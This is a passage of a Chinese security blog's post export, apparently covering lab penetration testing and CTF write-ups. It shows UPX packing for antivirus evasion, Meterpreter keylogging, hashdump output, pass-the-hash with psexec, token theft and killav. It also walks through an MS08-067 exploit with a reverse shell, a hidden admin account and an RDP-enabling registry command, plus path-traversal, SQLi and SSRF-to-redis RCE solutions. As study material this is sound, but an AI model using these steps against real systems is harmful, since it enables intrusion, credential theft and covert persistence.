加壳软件\n\n加壳软件是一种能够对可执行文件进行加密压缩并将压缩代码嵌入其中的工具，当加过壳的文件被执行后，解压代码会从已压缩的数据中重建原始程序并运行。这些过程对用户是透明的，所以加壳后的程序可以代替原始程序使用。\n\n下面使用UPX加壳软件对我们的攻击载荷文件进行编码和压缩，以尝试对该文件进行免杀处理\n\n执行`upx`命令查看它支持哪些选项\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728121123.png)\n\n使用**-5**选项对我们的可执行文件进行压缩并加壳\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200728121426.png)\n\n可以看见upx将我们的原始攻击文件体积进行了压缩，这样加壳过后的文件就可以一定程度上降低被杀毒软件检测的风险。","tags":["metasploit"],"categories":["渗透测试"]},{"title":"meterpreter基本使用","url":"/2020/07/27/msf_note4/","content":"\nmeterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行更为深入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击等等\n\n介绍meterpreter功能特性之前首先攻陷一台系统并取得一个Meterpreter shell，然后再利用meterpreter作为攻击载荷，展示它在进入目标系统后的一些其他攻击方法和技术，这里展示xp，攻击过程前一篇已经写过不再赘述，直接到达取得Meterpreter shell界面\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727111047.png)\n\n### 基本命令\n\n**screenshot**：获取目标系统活动用户的桌面截图并保存至攻击机\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134346.png)\n\n**sysinfo**：获取系统运行的平台\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134450.png)\n\n**ps**：获取目标系统正在运行的进程\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727134728.png)\n\n**获取键盘记录**\n\n使用migrate命令将会话迁移至explorer.exe的进程空间中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135047.png)\n\n启动keylog_recoder模块，一段时间后使用ctrl+v终止\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135253.png)\n\n可以看到记录被保存在了txt文件中，内容正是记录期间目标靶机的键盘使用记录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727135811.png)\n\n### 挖掘用户名和密码\n\n除了上述键盘记录可以获取用户密码等敏感信息之外，Meterpreter也可以获取系统本地文件中的用户名和密码\n\n#### 获取密码哈希值\n\n使用`use priv`命令，意味着运行在特权账户上，使用`hashdump`命令可以获取目标系统所有的用户名和密码哈希值\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727140617.png)\n\n#### 传递哈希值\n\n虽然我们提取到了用户名和密码的哈希值，但如果密码设置复杂，我们就不能在可接受的时间内将明文密码破解出来。如果不知道明文密码，如何通过这个用户账号登录到更多的主机呢。\n\n这里将用到哈希传递技术，仅仅有密码的哈希值就够了，而不需要将密码明文，Metasploit的`windows/smb/psexec`模块就可以实现\n\n```\nuse exploit/windows/smb/psexec \nshow options\nset RHOST 192.168.48.134\nset LHOST 192.168.48.128\nset LPORT 443\nset SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nset SMBUser Administrator\nshow options\nrun\n```\n\n#### 令牌假冒\n\n使用ps可以看到目标靶机的进程以及运行这些应用的用户账号\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727190150.png)\n\n使用`steal_token`命令和PID参数来盗取管理员用户的令牌\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727190636.png)\n\n现在Metasploit是以管理员用户来运行的了。\n\n有时候ps不能列出域管理员运行的进程，我们可以使用`incognito`命令列举出系统上可以利用的令牌\n\n通过`use incognito`命令加载incognito模块，然后通过`list_token -u`命令列举出令牌\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727191029.png)\n\n然后使用`impersonate_token`命令扮演令牌，注意这里要用两个斜杠\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727191212.png)\n\n现在就成功假冒为管理员并具有相应权限了。\n\n### 使用Metasploit脚本\n\n通过`run [name]`命令可以在Meterpreter终端中执行扩展脚本，下面列出几个常用脚本\n\n**run vnc**：将受控系统的桌面通信通过隧道方式映射过来，使得你可以访问到图形化桌面\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727201813.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727201848.png)\n\n**run  post/windows/manage/migrate**：将Metasploit会话迁移至内存空间的其他稳定的，不会被关闭的服务进程中，以维持稳定的系统控制连接\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202151.png)\n\n**run killav**：可以关闭某些智能化防毒软件和主机入侵防御产品\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202421.png)\n\n**run hashdump**：获取密码哈希值\n\n```\nmeterpreter > run hashdump \n[*] Obtaining the boot key...\n[*] Calculating the hboot key using SYSKEY a4a0fd97de24e4ad0028b54c7dd055d0...\n/usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated\n[*] Obtaining the user list and keys...\n[*] Decrypting user keys...\n/usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated\n/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated\n/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated\n[*] Dumping password hints...\n\nNo users with password hints on this system\n\n[*] Dumping password hashes...\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHelpAssistant:1000:b3d8d3ca5e354eb1eee90cccd2029f2d:99418b20ca08597feaadf1959619e0a2:::\nSUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2098344bc829d0d369d7d324bf8eb16c:::\nblacknight:1005:44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::\n\n```\n\n**run packetrecorder -i 1**：查看目标机的所有流量\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727202711.png)\n\n**run scraper**：scraper可以列举出系统上的绝大部分信息，可以获取用户名和密码，下载全部注册表，挖掘密码哈希值，收集系统信息等等\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200727203131.png)","tags":["metasploit"],"categories":["渗透测试"]},{"title":"metasploit渗透实例","url":"/2020/07/26/msf_note3/","content":"\n### 渗透测试基础\n\n#### Metasploit基本命令\n\n**show exploits**：显示Metasploit框架中所有可用的渗透攻击模块\n**show auxiliary**：显示所有辅助模块以及他们的用途\n**show options**：列出当前模块所需的各种参数，如果当前没有选择模块，则显示所有的全局参数\n**back**：返回Metasploit的上一个状态，常用于修改某个参数之后\n**search**：查找某个特定的渗透攻击，辅助或者攻击载荷模块\n**show payloads**：显示与当前模块兼容的可用攻击载荷\n**show target**：模块下列出受到漏洞影响的目标系统的类型\n**info**：可以加上模块的名字显示目标模块的详细信息，参数说明以及可用的系统类型，如果已选择了模块，直接在提示符下输入info即可\n**set和unset**：Metasploit模块中所有参数只有set和unset两个状态，输入show options可以查看哪些参数是必填的，使用set命令对某个参\t\t\t\t\t 数进行设置，使用unset命令可以禁用相关参数\n**steg和unsetg**：对全局参数进行设置或清除，使用这组命令可以让你不必每次遇见某个参数都要重新设置\n**save**：可以在任何时候输入save命令以保存当前状态，例如使用steg对参数进行设置后save，这样下次启动msf时还能使用这些设置值\n\n### 一次完整的msf渗透攻击\n\n攻击机：kali linux\n靶机：windows xp sp2\n利用安全漏洞：MS08-067\n\n> MS08-067漏洞将会影响除Windows Server 2008 Core以外的所有Windows系统，包括：Windows 2000/XP/Server 2003/Vista/Server 2008的各个版本，甚至还包括测试阶段的Windows 7 Pro-Beta。这些操作系统服务器服务中的漏洞可能允许远程执行代码\n\n#### nmap扫描\n\nmsf中执行\n\n```\nnmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.48.134\n```\n\n`-sT`是指隐秘的TCP连接扫描，`-A`指高级操作系统探测功能，`--script=smb-vuln-ms08-067`是用到了nmap的插件，`-P0`是指无ping扫描\n\n扫描结果如下\n\n```\nmsf5 > nmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.48.134\n[*] exec: nmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.48.134\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 02:45 EDT\nNmap scan report for 192.168.48.134\nHost is up (0.00085s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds\nMAC Address: 00:0C:29:47:58:93 (VMware)\nDevice type: general purpose\nRunning: Microsoft Windows XP|2003\nOS CPE: cpe:/o:microsoft:windows_xp::sp2:professional cpe:/o:microsoft:windows_server_2003\nOS details: Microsoft Windows XP Professional SP2 or Windows Server 2003\nNetwork Distance: 1 hop\nService Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp\n\nHost script results:\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250\n|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.85 ms 192.168.48.134\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.02 seconds\n\n```\n\n可以看到报告处确实发现了MS08-067漏洞并且VULNERABLE，提示我们可以进一步攻击\n\n#### 使用Metasploit获取shell\n\n在Metasploit中找到可用于此漏洞的模块\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726150553.png)\n\n使用use加载这个模块\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726150654.png)\n\n设置攻击载荷为基于Windows系统的Meterpreter reverse_tcp，这个载荷会在攻击成功后从目标主机发起一个反弹连接并连接到LHOST中指定的IP地址，以此绕过防火墙的入站流量保护或者来穿透NAT网关\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726151215.png)\n\n使用`show target`识别匹配该模块影响的操作系统类型并执行`set TARGET`指定目标操作系统类型（大多数MSF渗透模块会自动对目标系统类型进行识别而不需要手工指定此参数，但针对MS08-067漏洞的攻击中通常无法正确的识别出系统类型）\n\n我们指定操作系统类型为Windows XP SP2 Chinese - Simplified (NX)，NX即为'No Execute'，表示windows启用了[DEP保护](https://www.dell.com/support/article/zh-cn/sln288643/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4-dep?lang=zh)，在Windows XP SP2中，DEP默认是启用的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153331.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153350.png)\n\n通过`set RHOST`命令设置目标靶机IP地址，`set LHOST`设置反向连接地址为攻击机IP，`set LPORT`设置攻击机监听的TCP端口号，\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153946.png)\n\n如果不确定哪个tcp端口能够成功连接，可以使用msf内置的模块施行暴力猜接，使用`search reverse_tcp_allports`搜索\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726164849.png)\n\n再`set payload windows/meterpreter/reverse_tcp_allports `即可，不过要注意最后执行攻击的时候是`exploit -j`\n\n最后输入`show options`确认这些参数都设置正确\n\n```\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS   192.168.48.134   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT    445              yes       The SMB service port (TCP)\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.48.128   yes       The listen address (an interface may be specified)\n   LPORT     8080             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   10  Windows XP SP2 Chinese - Simplified (NX)\n```\n\n输入`exploit`初始化攻击环境并开始攻击\n\n```\nmsf5 exploit(windows/smb/ms08_067_netapi) > exploit \n\n[*] Started reverse TCP handler on 192.168.48.128:8080 \n[*] 192.168.48.134:445 - Attempting to trigger the vulnerability...\n[*] Sending stage (180291 bytes) to 192.168.48.134\n[*] Meterpreter session 1 opened (192.168.48.128:8080 -> 192.168.48.134:1055) at 2020-07-26 03:42:03 -0400\n\nmeterpreter > \n```\n\n可以看到这次攻击是成功的，它为我们返回了一个reverse_tcp方式的Metasploit攻击载荷会话，此时可以使用`sessions <ID>`命令查看远程运行的Meterpreter情况\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162743.png)\n\n直接执行shell命令会把我们直接带到命令提示符状态栏下\n\n```\nmeterpreter > shell \nProcess 2028 created.\nChannel 1 created.\nMicrosoft Windows XP [�汾 5.1.2600]\n(C) ��Ȩ���� 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>whoami\nwhoami\n'whoami' �����ڲ����ⲿ���Ҳ���ǿ����еĳ���\n���������ļ���\n\nC:\\WINDOWS\\system32>ipconfig\nipconfig\n\nWindows IP Configuration\n\n\nEthernet adapter ��������:\n\n        Connection-specific DNS Suffix  . : localdomain\n        IP Address. . . . . . . . . . . . : 192.168.48.134\n        Subnet Mask . . . . . . . . . . . : 255.255.255.0\n        Default Gateway . . . . . . . . . : 192.168.48.2\n\nC:\\WINDOWS\\system32>\n```\n\n之所以乱码，是因为kali中不支持windows的编码，一般可以通过命令`chcp 65001`解决，但这里不知道为啥解决不了，可能是会话不稳定导致\n\n#### 进一步渗透\n\n使用`net user host$ /add`命令添加一个隐藏用户host$\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161023.png)\n\n`net user`查看用户\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161150.png)\n\n`net user host$ password`为用户设置密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161414.png)\n\n`net localgroup administrators host$ /add`将用户加到administrators组中提升该用户权限，再次`net user host$`查看该用户可以看到用户组已经改变\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161536.png)\n\n利用kali自带的远程连接工具登录靶机，发生错误\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726161749.png)\n\n解决方法是在msf中输入如下命令开启终端服务\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f\n```\n\n再次连接发现成功开启窗口\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162005.png)\n\n使用刚添加的用户进行登录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162207.png)\n\n创建一个新用户验证权限\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726162422.png)\n\n到此，一次简单完整的渗透攻击结束。","tags":["metasploit"],"categories":["渗透测试"]},{"title":"DASCTF安恒七月赛","url":"/2020/07/25/Dasctf_web/","content":"\n### Ezinclude\n\n源码处发现可疑链接，有两个参数`t`和`f`，t经过大佬告诉是unix时间戳\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725153712.png)\n\n`f`参数是文件名的base64，直接打开链接会得目标文件的内容，但t会过期只有五秒时间，写个脚本好测试\n\n```python\nimport requests\nimport re\n\nurl = 'http://183.129.189.60:10009/'\n\nresponse = requests.get(url=url).text\n\ntext = re.findall(r'\\b\\d+\\b',response)\n\nvalue = \"\".join(text[1])\n\nurl_add = url+\"image.php?t=\"+value+\"&f=what_you_want\"\n\nresponse2 = requests.get(url=url_add).text\n\nprint(response2)\n```\n\n试了n久。。。没成功，后来大佬告诉是`file:///../../../../../flag`才成功，赛后看y1ng师傅的wp得知只要/../前面有内容/../就不会被过滤。。（吐血），直接`whatever/../../../../../flag`base64传入\n\n看下waf是怎么写的\n\n```\n<?php\n\n        if(!isset($_GET['t']) || !isset($_GET['f'])){\n                echo \"you miss some parameters\";\n                exit();\n        }\n\n        $timestamp = time();\n\n        if(abs($_GET['t'] - $timestamp) > 10){\n                echo \"what's your time?\";\n                exit();\n        }\n\n        $file = base64_decode($_GET['f']);\n\n        if(substr($file, 0, strlen(\"/../\")) === \"/../\" || substr($file, 0, strlen(\"../\")) === \"../\" || substr($file, 0, strlen(\"./\")) === \"./\" \n|| substr($file, 0, strlen(\"/.\")) === \"/.\" || substr($file, 0, strlen(\"//\")) === \"//\") {\n                echo 'You are not allowed to do that.';\n        }\n        else{\n                echo file_get_contents('/var/www/html/img/'.$file);\n        }\n\n?>\n```\n\nsubstr截取的是从左边开始strlen()的长度，只要截取的这几位不是/../就不会触发waf。\n\n### SQli\n\n找回显位常规操作，union查询直接可以得到数据库\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725155659.png)\n\n关键是这个正则\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725155955.png)\n\n过滤了in，or也就是information_schema不能用了，又过滤了stat和auto，这样information_schema相似作用的`sys.schema_auto_increment_columns`以及`schema_table_statistics_with_buffer`什么的都用不了的（参考：https://www.cnblogs.com/wangtanzhi/p/12594949.html）\n\ngoogle找了蛮久没找到，后来看wp才想起来还有个`sys.x$schema_flattened_keys`，关键是我之前自己也[记过](https://www.blacknight.top/2020/04/16/note8/)。。。我也是醉了。。。继续union查询\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725160833.png)\n\n最后因为得不到列名直接select * from flag(注意显示位的顺序和个数)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725160931.png)\n\nps：后来瞄到一眼群里大佬说[schema_tables_with_full_table_scans](https://zhuanlan.zhihu.com/p/43959781)也可以，神奇的sys数据库\n\n### welcome to the misc world\n\n下载附件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191430.png)\n\nlsb隐写，linux安装zteg\n\n```\ngem install zsteg\n```\n\n分析red_bule.png，发现png\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191652.png)\n\n提取得到png，查看为压缩包密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191733.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191815.png)\n\n360压缩打开直接忽略NTFS隐写\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725191939.png)\n\n输入密码查看flag.txt\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725192040.png)\n\nbase85解码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200725192116.png)","tags":["sql"],"categories":["CTF"]},{"title":"metasploit配合nessus","url":"/2020/07/24/msf_note2/","content":"\n### 基本的漏洞扫描\n\n<!-- more -->\n\n#### 使用nessus进行扫描\n\n安装配置nessus，官网下载对应版本安装：http://www.tenable.com/products/nessus/nessus-plugins/obtain-an-activation-code\n\n获取激活码激活，创建用户名并进行安装\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724104530.png)\n\n创建Nessus扫描策略，自定义Plugins\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724110548.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724133724.png)\n\n新建扫描\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724133810.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724133931.png)\n\n开始任务，等待一会扫描完毕\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724214933.png)\n\n#### 将扫描结果导入Metaspliot框架中\n\n保持数据库连接状态\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724175613.png)\n\n点击export导出报告文件，生成以.nessus的可以被metasploit解析的格式\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724175729.png)\n\n使用`db_import`命令将文件导入数据库中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724181109.png)\n\n执行hosts命令验证主机和漏洞数据是否导入，这里生成简要列表，包含了ip，探测到的服务数量以及漏洞数量\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724181509.png)\n\n如果想显示详细的漏洞列表，可以输入不包含任何参数的vulns命令\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724181721.png)\n\n#### Metasploit使用Nessus扫描\n\n执行`load nessus`命令载入Nessus插件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724182623.png)\n\n`nessus_help`查看Nessus插件支持的命令\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724182720.png)\n\n开始扫描前，必须使用`nessus connect username:password@127.0.0.1:8843`命令登录到你的Nessus服务器上\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724184540.png)\n\n启动扫描时需要指定一个已经定义的扫描策略的ID号，可以使用`nessus_policy_list`列出服务器上所有已经定义的扫描策略\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724184809.png)\n\n输入`nessus_scan_new`命令，并在后面加上扫描策略的ID号、扫描任务的名字、任务描述以及目标的IP地址\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190018.png)\n\n这里出现本来出现了错误，后来参考了https://github.com/rapid7/metasploit-framework/issues/11117找到解决方法\n\n创建好扫描之后输入`nessus_scan_launch ID`执行扫描任务\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190248.png)\n\nrunning代表正在执行，completed代表扫描结束\n\n扫描结束后，可以使用`nessus_db_import`命令将指定扫描任务的报告导入到Metasploit数据库中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190548.png)\n\n同样可以使用`host`命令查看数据\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200724190708.png)\n\n","tags":["metasploit","nessus"],"categories":["渗透测试"]},{"title":"网鼎杯2020玄武组——SSRFMe","url":"/2020/07/23/[wangdingbei 2020 玄武组]SSRFMe/","content":"\n平台：buuoj.cn\n\n直接给出源码\n\n```php\n<?php\nfunction check_inner_ip($url)\n{\n    $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url);\n    if (!$match_result)\n    {\n        die('url fomat error');\n    }\n    try\n    {\n        $url_parse=parse_url($url);\n    }\n    catch(Exception $e)\n    {\n        die('url fomat error');\n        return false;\n    }\n    $hostname=$url_parse['host'];\n    $ip=gethostbyname($hostname);\n    $int_ip=ip2long($ip);\n    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;\n}\n\nfunction safe_request_url($url)\n{\n\n    if (check_inner_ip($url))\n    {\n        echo $url.' is inner ip';\n    }\n    else\n    {\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        curl_setopt($ch, CURLOPT_HEADER, 0);\n        $output = curl_exec($ch);\n        $result_info = curl_getinfo($ch);\n        if ($result_info['redirect_url'])\n        {\n            safe_request_url($result_info['redirect_url']);\n        }\n        curl_close($ch);\n        var_dump($output);\n    }\n\n}\nif(isset($_GET['url'])){\n    $url = $_GET['url'];\n    if(!empty($url)){\n        safe_request_url($url);\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n// Please visit hint.php locally.\n?>\n```\n首先对传入的url进行check_inner_ip检查是否为内网ip地址，这一部分限制了协议的使用，使用parse_url解析url，并使用gethostname、ip2long函数获取ip地址以及将ip地址转化为整数，不允许内网ip发送请求。\n通过检查则返回safe_request_url使用curl处理。\n注释提示我们应当以本地访问hint.php，我们构造如下url传入\n\n```php\n?url=http://0.0.0.0/hint.php\n```\n0.0.0.0的IP地址表示整个网络，代表所有主机的ipv4地址，传入绕过\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723153122774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n得知redis的密码是root，考点是redis主从复制rce。\n下载以下脚本到同一目录下\nhttps://github.com/n0b0dyCN/redis-rogue-server\nhttps://github.com/xmsec/redis-ssrf\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723160244375.png)\n修改python文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723162511683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723160543421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723161234489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n生成payload\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020072316221016.png)\n启动redis rogue server, 接受redis的连接\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723162230294.png)\n把payload传入，这里注意还要url编码一次\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723162351694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200723162409936.png)\n得到flag","tags":["serialize","代码审计","redis主从复制rce"],"categories":["buu刷题"]},{"title":"metasploit基础扫描","url":"/2020/07/22/msf_note1/","content":"\n缓缓拿起桌上当了几个月垫子的metasploit渗透测试指南。\n\n<!-- more -->\n\n### Metasploit的一些术语\n\n渗透攻击exploit：攻击者或渗透攻击者利用系统、应用或服务中的安全漏洞所进行的攻击行为\n攻击载荷payload：我们期望目标系统在被渗透攻击之后去执行的代码，在Metasploit框架中可以自由的选择、传送和植入\nshellcode：在渗透攻击时作为攻击载荷运行的由汇编语言编写的一组机器指令\n模块(Module)：一个模块是指Metasploit框架中所使用的一段软件代码组件\n监听器(Listener)：Metasploit中用来等待连入网络连接的组件\n\n### Metasploit功能程序\n\n#### MSF攻击载荷生成器\n\nMSF攻击载荷生成器允许你能够生成shellcode、可执行代码和其他更多，也可以让它们在框架软件之外的渗透代码中进行使用。2015年开始Metasploit弃用了早期版本的msfpayload，转而使用集成了攻击载荷生成和编码的msfvenom替代\n\n查看msfvenom配置选项命令是：msfvenom -h\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722222447.png)\n\n#### MSF编码器\n\nMetasploit中包含了一系列可用于不同场景下的编码器，一些编码器在你只能使用字母和数字字符来构造攻击载荷时非常有用。在2015年之后的版本，msfpayload和msfencode被一起弃用，编码的功能也一同集成于msfvenom。\n\n如果需要查看有哪些可用的编码器以及他们的等级，可以使用命令：msfvenom -l encoders\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722223442.png)\n\n#### Nasm shell\n\nNasm_shell.rb是一个帮助我们了解汇编代码含义的功能程序，比如我们可以运行程序请求汇编命令的opcode操作码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722223927.png)\n\n### Metasploit使用数据库\n\n#### 连接数据库\n\nMetasploit提供多种数据库的支持，帮助渗透测试人员在进行复杂渗透测试工作时记录操作\n\n以PostgreSQL为例\n\n启动数据库子系统\n\n```\n/etc/init.d/postgresql start\n```\n\n连接数据库需要用户名，密码，主机名以及想要使用的数据库名，postgresql的默认用户名是postgres，密码是toor，如忘记密码，可输入命令`sudo -u postgres psql  `登录postgresql，再输入`ALTER USER postgres WITH PASSWORD 'newpassword';`修改密码即可\n\n在metasploit中和postgresql使用msf作为数据库名建立连接\n\n```\ndb_connect 